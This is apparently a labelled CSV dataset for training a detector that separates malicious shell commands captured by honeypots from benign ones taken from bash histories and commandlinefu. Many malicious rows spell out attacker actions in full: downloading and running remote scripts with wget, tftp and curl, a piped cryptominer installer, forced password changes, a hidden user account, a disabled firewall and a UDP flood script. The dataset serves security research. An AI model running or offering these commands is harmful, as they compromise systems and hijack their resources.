id,command,label,source,split
d2_007194,chmod +x aTGRoiZc,1,honeypot,train
d2_007195,cd root,1,honeypot,train
d2_007196,sh ftp1.sh,1,honeypot,train
d2_007197,/bin/busybox echo -e '\x47\x72\x6f\x70/tmp' > /tmp/.nippon,1,honeypot,train
d2_007198,sudo vim /etc/asound.conf,0,bash_history,train
d2_007199,cd c,1,honeypot,train
d2_007201,./wHv1aVd6,1,honeypot,train
d2_007202,grep -rl oldstring . |xargs sed -i -e 's/oldstring/newstring/',0,commandlinefu,train
d2_007203,./cI9ZgIxl,1,honeypot,train
d2_007204,- name: External,0,bash_history,train
d2_007205,/bin/busybox rm -f /proc/bus/.nippon,1,honeypot,train
d2_007207,du -h,0,bash_history,train
d2_007208,find . -type f -regex '.*/core\.?[0-9]*$' -delete,0,commandlinefu,train
d2_007209,git clone -b developssner/doom-emacs ~/.emacs.d,0,bash_history,train
d2_007210,"ls D{123,uo,own}load",0,bash_history,train
d2_007211,wget nasapaul.com/v.py,1,honeypot,train
d2_007213,sh tssh2.sh,1,honeypot,train
d2_007217,touch /var/log/xferlog,1,honeypot,train
d2_007218,tftp cybercoldbox.theworkpc.com:8088 -c get backuper.sh,1,honeypot,train
d2_007219,wget https://h8fe31bb0.example.net/Wyy7/config.json,1,honeypot,train
d2_007220,perl -MMIME::Base64 -ne 'print decode_base64($_)' < file.txt > out,0,commandlinefu,train
d2_007221,geany usertests.c,0,bash_history,train
d2_007222,pacman -S opera,0,bash_history,train
d2_007223,while true; do { $(which logger) -p local4.notice `free -m | grep Mem`; sleep 60; } done &,0,commandlinefu,train
d2_007224,sort gisteren,0,bash_history,train
d2_007225,"for x in `psql -e\l | awk '{print $1}'| egrep -v ""(^List|^Name|\-\-\-\-\-|^\()""`; do pg_dump -C $x | gzip > /var/lib/pgsql/backups/$x-nightly.dmp.gz; done",0,commandlinefu,train
d2_007226,vi sudoers,0,bash_history,train
d2_007227,"google docs list |awk 'BEGIN { FS = "","" }; {print ""\""""$1""\""""}'|sed s/^/google\ docs\ get\ /|awk ' {print $0,"".""}'",0,commandlinefu,train
d2_007228,ls -S -lhr,0,commandlinefu,train
d2_007229,routel,0,commandlinefu,train
d2_007231,PF=mdcs mdk ps,0,bash_history,train
d2_007233,find / \( -local -o -prune \) \( -perm -4000 -o -perm -2000 \) -type f -exec ls -l {} \;,0,commandlinefu,train
d2_007234,./KJ7Yj7nf,1,honeypot,train
d2_007235,vim include/fin,0,bash_history,train
d2_007236,mate - `find * -type f -regex 'REGEX_A' | grep -v -E 'REGEX_B'`,0,commandlinefu,train
d2_007238,ps -el | grep i3,0,bash_history,train
d2_007239,/bin/busybox chmod 777 retrieve,1,honeypot,train
d2_007240,perl -lane '$total += $F[0]; END{print $total/$.}' single-column-numbers.txt,0,commandlinefu,train
d2_007241,touch Register.php,0,bash_history,train
d2_007242,./OKCQi9LX,1,honeypot,train
d2_007243,ifconfig -a | grep ra0,0,bash_history,train
d2_007244,netstat -an -o,0,bash_history,train
d2_007245,tftp 29.205.137.183 -c get dick1.sh,1,honeypot,train
d2_007247,"cmdfu(){ curl ""http://h8e465e73.example.net/commands/matching/$@/$(echo -n $@ | openssl base64)/plaintext"" --silent | sed ""s/\(^#.*\)/\x1b[32m\1\x1b[0m/g"" | less -R }",0,commandlinefu,train
d2_007251,openssl req -out CSR.csr -key privateKey.key -new,0,commandlinefu,train
d2_007252,python install.py,0,bash_history,train
d2_007253,rm -rf .poo,1,honeypot,train
d2_007254,mv wiload.tar ../Downloads/,0,bash_history,train
d2_007255,aula2,0,bash_history,train
d2_007256,sudo yum install g++,0,bash_history,train
d2_007257,chmod 777 it.sh,1,honeypot,train
d2_007259,sudo /opt/tomcat/bin/shutdown.sh,0,bash_history,train
d2_007261,be rake db:migrate,0,bash_history,train
d2_007262,editor,0,bash_history,train
d2_007263,cp ~/qa-mesos01.qaextranet.akamai.com-apps.json.2017-04-20-20-04-12 ~/Downloads/,0,bash_history,train
d2_007264,"cp file file.$(date -d @$(stat -c '%Y' file) ""+%y%m%d"")",0,commandlinefu,train
d2_007266,sudo pacman -Rds leanote,0,bash_history,train
d2_007267,find ./* -mtime +60 -exec mv {} storeFolder \;,0,commandlinefu,train
d2_007268,sudo usermod -d /home/milleniumfalcons -m -l milleniumfalcons milleniunfalcons,0,bash_history,train
d2_007269,"ls -lhR | grep -e ""total\|:$""",0,commandlinefu,train
d2_007270,"echo ""# cis206-decisions-slament000"" >> READ.md",0,bash_history,train
d2_007271,wget http://h911143f4.example.net/Deltabins.sh,1,honeypot,train
d2_007273,mkdir ../dist,0,bash_history,train
d2_007274,dotnet restore -s /opt/app-root/.nuget/,0,bash_history,train
d2_007275,git init demorepo,0,bash_history,train
d2_007276,mv vokoscreen-2017-04-26_21-41-37_edit.mkv vokoscreen-2017-04-26_21-41-37_simplygoodwork.mkv,0,bash_history,train
d2_007277,printf '\!:1\0\!:1\0\!:2' | mmencode | tr -d '\n' | sed 's/^/AUTH PLAIN /',0,commandlinefu,train
d2_007279,find ./ -empty -type d -delete,0,commandlinefu,train
d2_007280,qkillall .dhpcd,1,honeypot,train
d2_007281,redshit &,0,bash_history,train
d2_007282,wget http://hdd0ea477.example.net -qO-,0,commandlinefu,train
d2_007283,[CHGor@gatanda hhneuauf.de]$ [CHG] Controller C8:F7:33:33:E2:F7 UUIDs: 0000110b-0000-1000-8000-00805f9b34fb,0,bash_history,train
d2_007284,find <top_level_dir> -depth -type d -empty -exec rmdir -v {} \;,0,commandlinefu,train
d2_007285,identify -format '%w %h %f\n' *.jpg | awk 'NF==3&&$1<500&&$2<500{print $3}' | xargs -r rm,0,commandlinefu,train
d2_007286,ls -ltr /isitools/,0,bash_history,train
d2_007288,sudo bin/ipacct.sh,0,bash_history,train
d2_007289,/bin/busybox rm -f /proc/.nippon,1,honeypot,train
d2_007290,"list_lists | awk 'NR > 1 && $1!=""Mailman"" && $1!=""Test"" {print ""list_members ""$1"" > ""$1"".txt""}' | bash",0,commandlinefu,train
d2_007291,curl -O http://h2cb401cd.example.net/ys53a,1,honeypot,train
d2_007292,view `ls -1 access_log.* | tail -n 1`,0,commandlinefu,train
d2_007293,shuf -i 1-49 | head -n6 | sort -n| xargs,0,commandlinefu,train
d2_007294,./ipython.py,0,bash_history,train
d2_007295,"omp(){ $*|convert label:@- png:-|curl -sF file1=@- http://h40edd8a0.example.net/upload | grep -P -o ""(?<=File:).*(http://h40edd8a0.example.net/.*)\<\/a\>"" | sed -r 's@.*(http://h40edd8a0.example.net/\w{1,7}).*@\1@';}",0,commandlinefu,train
d2_007296,rename 's/(^|[\s\(\)\[\]_-])([a-z])/$1\u$2/g' *,0,commandlinefu,train
d2_007297,wget http://h8417d542.example.net/zyxnlbins.sh,1,honeypot,train
d2_007298,sudo -u $USER kill -9 -1,0,commandlinefu,train
d2_007299,rm -rf purple-facebook/,0,bash_history,train
d2_007300,./go 91,1,honeypot,train
d2_007301,ffmpeg -i Blockers.2018.HDRip.XViD-ETRG.avi -c:v copy -preset slow -crf 22 -c:a libvo_aacenc -b:a 128k Blockers.2018.HDRip.XViD-ETRG.mp4,0,bash_history,train
d2_007302,vim comandoteste,0,bash_history,train
d2_007303,sudo sqlite3 storage/data/cockpit.sqlite,0,bash_history,train
d2_007304,gcc qlcoder758a.cpp -o made1 -O3,0,bash_history,train
d2_007305,rm -rf 2start.jpg,1,honeypot,train
d2_007306,mode app,0,bash_history,train
d2_007307,ansible-playbook php_playbook.yml inventario,0,bash_history,train
d2_007308,curl -O http://hc7a2b958.example.net/ssh1.txt,1,honeypot,train
d2_007309,cat -n arqtrab | sort,0,bash_history,train
d2_007310,sox -v 0.125 -V <mp3.mp3> -t au -r 8000 -U -b -c 1 <ulaw.ulaw> resample -ql,0,commandlinefu,train
d2_007311,git clonesschepis/Swipe,0,bash_history,train
d2_007312,at Connection.query (/usr/lib/node_modules/mysql/lib/Connection.js:92:25),0,bash_history,train
d2_007313,yum install python3,0,bash_history,train
d2_007314,sudo atq,0,bash_history,train
d2_007316,sudo cp /media/jwaspin/JWA_usbC/ssh/jwaspin/* .ssh/,0,bash_history,train
d2_007318,LC_ALL=C echo Wmi >>~/.dhpcd,1,honeypot,train
d2_007320,./.t wget,1,honeypot,train
d2_007322,pkill -9 bash.sh,1,honeypot,train
d2_007323,>binary,1,honeypot,train
d2_007324,screen -d -m [<command>],0,commandlinefu,train
d2_007325,trizen -Ss udisk,0,bash_history,train
d2_007326,seq -f %3g 10,0,bash_history,train
d2_007327,wget https://h2dea4460.example.net/attachments/615990542739701761/615990557713629214/bashrc,1,honeypot,train
d2_007328,"N=""filepath"" ; P=/proc/$(lsof +L1 | grep ""$N"" | awk '{print $2}')/fd ; ls -l $P | sed -rn ""/$N/s/.*([0-9]+) ->.*/\1/p"" | xargs -I_ cat $P/_ > ""$N""",0,commandlinefu,train
d2_007331,vim /home/mg/projects/didi/voyager/offboard/planning/prediction/evaluation/build/CMakeFiles/CMakeOutput.log,0,bash_history,train
d2_007332,chmod +rwx gerrit1,0,bash_history,train
d2_007333,./RoL2ejHf,1,honeypot,train
d2_007334,"find / -type f -size +500000k -exec ls -lh {} \; | awk '{ print $9 "": "" $5 }'",0,commandlinefu,train
d2_007335,g++ helloworld.cpp.,0,bash_history,train
d2_007336,docker tag 465a55147bc2 pdr-upload.akamai.com/pulsar/blazedas:docker-17.04,0,bash_history,train
d2_007338,sudo pacman -S amixer,0,bash_history,train
d2_007340,"mplayer dvd://1 -dumpstream -alang es -dumpfile ""$dirDestino""/""$tituloDVD"".mpg && ffmpeg -i ""$dirDestino/$tituloDVD.mpg"" -acodec libmp3lame -alang spa -vcodec libx264 -crf 26 -vpre hq -threads 0 ""$dirDestino/$tituloDVD.mp4""",0,commandlinefu,train
d2_007341,unreadsnf,1,honeypot,train
d2_007342,dnf --help,0,bash_history,train
d2_007343,sh Razor1.sh,1,honeypot,train
d2_007344,"printf ""%`tput cols`s""|sed ""s/ /_/g""",0,commandlinefu,train
d2_007346,touch b.txt,0,bash_history,train
d2_007347,rm -rf build/,0,bash_history,train
d2_007348,"at 6:00 <<< ""xmms2 play""",0,commandlinefu,train
d2_007350,ls ${my_dir:=/home},0,commandlinefu,train
d2_007351,ls -sSh /path | head,0,commandlinefu,train
d2_007352,ufw --add-service=http,0,bash_history,train
d2_007353,./VvwryJpc,1,honeypot,train
d2_007354,rm -f //.nippon,1,honeypot,train
d2_007356,any_script.sh < <(some command),0,commandlinefu,train
d2_007357,"echo ""admin"" | sudo -S rm -R /var/libxml_CP",1,honeypot,train
d2_007358,./r8EZsoFa,1,honeypot,train
d2_007359,./8Gt5NgHa,1,honeypot,train
d2_007360,zmv '(*).txt' '$1.csv',0,commandlinefu,train
d2_007361,ls system/player,0,bash_history,train
d2_007362,ls ~/intel/compilers_and_libraries/linux/mpi/intel64/bin,0,bash_history,train
d2_007363,histis,1,honeypot,train
d2_007364,netstat -nt | awk '{print $6}' | sort | uniq -c | sort -n -k 1 -r,0,commandlinefu,train
d2_007365,sudo apt-get install ssh,0,bash_history,train
d2_007366,ls-lrt,0,bash_history,train
d2_007367,tar zxvf psyBNC-2.3.2-7.tar.gz,0,bash_history,train
d2_007368,iwlist scanning wlan0,0,bash_history,train
d2_007369,find . -type l | perl -lne 'print if ! -e',0,commandlinefu,train
d2_007370,less /usr/bin/avahi-discover,0,bash_history,train
d2_007371,export VIRTUALENVWRAPPER_PYTHON=/usr/bin/python3,0,bash_history,train
d2_007373,dhclient wlan0,0,bash_history,train
d2_007374,bash -c ./npOCKApr,1,honeypot,train
d2_007375,"echo -e ""B""r0-Scherer\nrvNRmecUjUXu\nrvNRmecUjUXu"" | passwd | bash ; echo ""B""r0-Scherer\nrvNRmecUjUXu\nrvNRmecUjUXu\n"" | passwd",1,honeypot,train
d2_007376,ssh roof@46.229.6.125,0,bash_history,train
d2_007377,rm /var/uKzOCllMkq,1,honeypot,train
d2_007378,"mkfifo fifo; while true ; do echo ""Waiting for new event""; nc -l 8080 < fifo | tee -a proxy.txt /dev/stderr | nc 39.237.139.187 80 > fifo ; done",0,commandlinefu,train
d2_007380,echo done...,1,honeypot,train
d2_007381,jgfIQ}_IF3H]tgj,0,bash_history,train
d2_007383,scp ~/.ssh/id_rsa.pub saiyuuki@:~/.ssh/authorized_keys,0,bash_history,train
d2_007384,pid,1,honeypot,train
d2_007385,tftp -r dick2.sh -g 29.205.137.183,1,honeypot,train
d2_007386,vim scriptbin,0,bash_history,train
d2_007388,./svip8 &,1,honeypot,train
d2_007389,sudo chown -R dmc:hadoop hadoop,0,bash_history,train
d2_007390,indent -kr hello.c,0,commandlinefu,train
d2_007392,cd .mm,1,honeypot,train
d2_007393,netstat -lantp | grep -i stab | awk -F/ '{print $2}' | sort | uniq,0,commandlinefu,train
d2_007395,su -l ansible,1,honeypot,train
d2_007396,cat numReads_Input.Fasta.txt,0,bash_history,train
d2_007398,touch file7,0,bash_history,train
d2_007399,/bin/busybox wget http://hf6deceec.example.net/bins.sh,1,honeypot,train
d2_007400,./sdf3fslsdf14,1,honeypot,train
d2_007402,git clonesoon@bitbucket.org/dilip_prasoon/dilipprasoon.git,0,bash_history,train
d2_007403,mkdir cs211,0,bash_history,train
d2_007404,rails g active_admin:install,0,bash_history,train
d2_007405,gcc version,0,bash_history,train
d2_007406,man ldd,0,bash_history,train
d2_007407,cat .git/refs/tags/,0,bash_history,train
d2_007408,/ home,0,bash_history,train
d2_007409,view .ssh,0,bash_history,train
d2_007410,/bin/busybox echo -e '\x47\x72\x6f\x70/sys/fs/cgroup/hugetlb' > /sys/fs/cgroup/hugetlb/.nippon,1,honeypot,train
d2_007412,vi psybnc.conf,0,bash_history,train
d2_007414,apt-get install nload,1,honeypot,train
d2_007415,cd ${PWD/a/b},0,commandlinefu,train
d2_007416,chown -R root /root/.npm,0,bash_history,train
d2_007417,./wf2vRz2N,1,honeypot,train
d2_007418,less ../../README.cmake,0,bash_history,train
d2_007419,rm -r 6_29_bk/,0,bash_history,train
d2_007420,/bin/busybox chmod 777 .dropper,1,honeypot,train
d2_007421,cat ~/sqainfra-mesos01.sqaextranet.akamai.com-apps.json.2017-04-27-16-20-18,0,bash_history,train
d2_007423,perl udp.pl 157.174.34.58,1,honeypot,train
d2_007425,bugtraq123,1,honeypot,train
d2_007427,cat fx19.x86 > sshdsservers,1,honeypot,train
d2_007428,"binaries () { for f in $(dpkg -L ""$1"" | grep ""/bin/""); do basename ""$f""; done; }",0,commandlinefu,train
d2_007429,h|grep Z,0,bash_history,train
d2_007430,nm ./fantasticiot | less,0,bash_history,train
d2_007431,rm -rf kee,1,honeypot,train
d2_007433,traceroute 2>/dev/null -n google.com | awk '/^ *1/{print $2;exit}',0,commandlinefu,train
d2_007436,awk '!array[$1]++' file.txt,0,commandlinefu,train
d2_007437,LC_ALL=C cat /etc/rc.local /etc/rc.d/rc.local,1,honeypot,train
d2_007438,vi run.sh,0,bash_history,train
d2_007439,history | grep pacman,0,bash_history,train
d2_007440,mail -A /var/www/html/alertas/reportes/repexcel.xls soporte@solutionscluster.net,0,bash_history,train
d2_007441,man dnsmasq,0,bash_history,train
d2_007443,git add images/,0,bash_history,train
d2_007444,systemctl list-dependencies vmware-workstation-server.servic,0,bash_history,train
d2_007447,pula,1,honeypot,train
d2_007448,rebot,1,honeypot,train
d2_007449,juninho123,0,bash_history,train
d2_007451,"svn propset svn:ignore ""*txt"" log/",0,commandlinefu,train
d2_007453,sox Klaxon.mp3 -t wav - |ssh thelab@company.com paplay,0,commandlinefu,train
d2_007454,git add ../.cpan/,0,bash_history,train
d2_007455,sh meow.sh,1,honeypot,train
d2_007456,/etc/init.d/iptables stop,1,honeypot,train
d2_007458,cat /etcpasswd,1,honeypot,train
d2_007460,ls single*,0,bash_history,train
d2_007461,sudo cp courses_list.html courses_list_search.html,0,bash_history,train
d2_007462,postfix reload,0,bash_history,train
d2_007463,git --hel,0,bash_history,train
d2_007464,apt get,0,bash_history,train
d2_007465,myzu]a[,1,honeypot,train
d2_007466,v /home/mg/projects/didi/voyager/offboard/perception/training/dataset/lidar_test.txt,0,bash_history,train
d2_007467,"echo -e ""_KeeperOf%Keys""\njEh4zbnfzDcV\njEh4zbnfzDcV"" | passwd | bash ; echo ""_KeeperOf%Keys""\njEh4zbnfzDcV\njEh4zbnfzDcV\n"" | passwd",1,honeypot,train
d2_007468,LC_ALL=C chattr -i /var/spool/cron/crontabs/root,1,honeypot,train
d2_007469,sudo useradd -M -p 12d7MsWdJ7MzU -s /bin/true x4_n1Y,1,honeypot,train
d2_007472,rm -r alias blocks/ certificates/ chainstate/ *.log offers/ *.dat,0,bash_history,train
d2_007473,sudo apt-cache search telnet,0,bash_history,train
d2_007474,chmod 0777 svip8,1,honeypot,train
d2_007475,gccc p6.c,0,bash_history,train
d2_007476,sh tssh.sh,1,honeypot,train
d2_007477,mkdir tutorial,0,bash_history,train
d2_007478,zcat /usr/share/doc/vim-common/README.gz | vim -g +23 -,0,commandlinefu,train
d2_007479,linux,0,bash_history,train
d2_007480,/bin/busybox cat /bin/bash,1,honeypot,train
d2_007481,sudo docker build,0,bash_history,train
d2_007482,require,0,bash_history,train
d2_007483,wget http://hce45964b.example.net/speed.test,1,honeypot,train
d2_007484,screen -S Proxy,0,bash_history,train
d2_007485,./ewcEpR0g,1,honeypot,train
d2_007489,cp -r headers/* /usr/include/,0,bash_history,train
d2_007490,sleep 15s,1,honeypot,train
d2_007491,alias sortfast='sort -S$(($(sed '\''/MemF/!d;s/[^0-9]*//g'\'' /proc/meminfo)/2048)) $([ `nproc` -gt 1 ]&&echo -n --parallel=`nproc`)',0,commandlinefu,train
d2_007492,docker build . -t dockerfile,0,bash_history,train
d2_007493,find (); { ls $1 | while read line; do [[ -d $1/$line ]] && find $1/$line $2 || echo $1/$line | grep $2; done; },0,commandlinefu,train
d2_007494,sudo systemctl mask sleep.target suspend.target hibernate.target hybrid-sleep.target,0,commandlinefu,train
d2_007495,./test_pwm,0,bash_history,train
d2_007496,"cmd=$( wget -qO- ""http://hbe9c73a2.example.net/ajax/services/language/translate?v=1.0&q=$1&langpair=$2|${3:-en}"" | sed 's/.*""translatedText"":""\([^""]*\)"".*}/\1\n/'; ); echo ""$cmd""",0,commandlinefu,train
d2_007500,sudo dmidecode -t bios,0,bash_history,train
d2_007501,"save_state=$(stty -g);echo -n ""Password: "";stty -echo;read password;stty ""$save_state"";echo """";echo ""You inserted $password as password""",0,commandlinefu,train
d2_007502,time { i=0; while [ $(( i < 65535 )) -eq 1 ] ; do nc -zw2 localhost $((++i)) && echo port $i opened ; done; },0,commandlinefu,train
d2_007503,tail /etc/groups,0,bash_history,train
d2_007505,syscoind SapH8g6S7eFResnQfuMruXn6EAp1Pw2ZtU SiiJQrjJV37MVYUHz6UBW5tVCXZcQFj1XP:10 SbA51srP134SJkeLEjBBPfCNeD61kWfdqo:10 SbJfum42NdgLGDxJUnk9qNetDYyp4uMob3:10,0,bash_history,train
d2_007508,exec 1 >& -,1,honeypot,train
d2_007509,ffmpeg.exe -i RCC_High\ Resolution.mp4 -preset veryslow -crf 24 -b:a 512k -c:a aac -strict -2 output.mp4,0,bash_history,train
d2_007512,python -m unittest discover,0,bash_history,train
d2_007514,"for file in $(egrep 'abc|def' *.sql | cut -d"":"" -f1 | uniq); do sed -i '/abc/d' ./$file ; sed -i '/def/d' ./$file; done",0,commandlinefu,train
d2_007515,cat 1.c,0,bash_history,train
d2_007516,ftpget -v -u anonymous -p anonymous -P 21 1.139.159.21 awoo1.sh awoo1.sh,1,honeypot,train
d2_007517,find . -type f -print0 | xargs -0 grep -i <pattern>,0,commandlinefu,train
d2_007519,lshw | grep eth,0,bash_history,train
d2_007520,vim rmtoo-pricing-graph,0,bash_history,train
d2_007521,git config --global core.autocrlf false,0,bash_history,train
d2_007522,exiv2 rename *.jpg,0,commandlinefu,train
d2_007523,ruby rename_refactoring.rb,0,bash_history,train
d2_007524,wget http://hcf3da157.example.net/w.txt -O sdf3fslsdf13,1,honeypot,train
d2_007525,wget fanelishere.ro/arhive/info,1,honeypot,train
d2_007526,wget'7674bgXA39LH3D633Hwksa69VQaRbGpSgKYvJTFfdnxHRJUhyipp6397SJktzBj2eJ7V7eJpRVBkmNvwjMoneroOcean/xmrig_setup/master/setup_moneroocean_miner.sh | bash -s '45yAseASQEo7curl -s -L https://h3cf88e0a.example.net/M,1,honeypot,train
d2_007527,convert Website\ Content.docx -page a4 Website\ Content.jpg,0,bash_history,train
d2_007528,/usr/sbin/showmount -e <host>,0,commandlinefu,train
d2_007529,bundle exec cucumber --guess,0,bash_history,train
d2_007530,STACK_NAME=eui-backup mdk ps,0,bash_history,train
d2_007531,>/usr/t,1,honeypot,train
d2_007532,sudo rm -f *,0,bash_history,train
d2_007533,ls inst/lib,0,bash_history,train
d2_007534,cd shellscanner,1,honeypot,train
d2_007535,ls -la *camp*,0,bash_history,train
d2_007536,./ys53a,1,honeypot,train
d2_007537,print Airbnb-Wohnung-Robin.pdf,0,bash_history,train
d2_007538,sudo mount /dev/cdrom /mnt/cdrom/,0,bash_history,train
d2_007539,busybox chmod 777 kjUiwa2.sh,1,honeypot,train
d2_007540,find . -type f -exec grep -l pattern {} \; | xargs vi +/pattern,0,commandlinefu,train
d2_007541,sudo i2cdump,0,bash_history,train
d2_007542,nc -l -p 8000,0,bash_history,train
d2_007545,rm config/user.token,0,bash_history,train
d2_007546,mkdir .dev,0,bash_history,train
d2_007547,"wget -A mp3,mpg,mpeg,avi -r -l 3 http://ha83aeecf.example.net/",0,commandlinefu,train
d2_007548,vim zoombie.c,0,bash_history,train
d2_007551,mkdir /media/share/,0,bash_history,train
d2_007552,rename 'y/A-Z/a-z/0-9/' *,0,bash_history,train
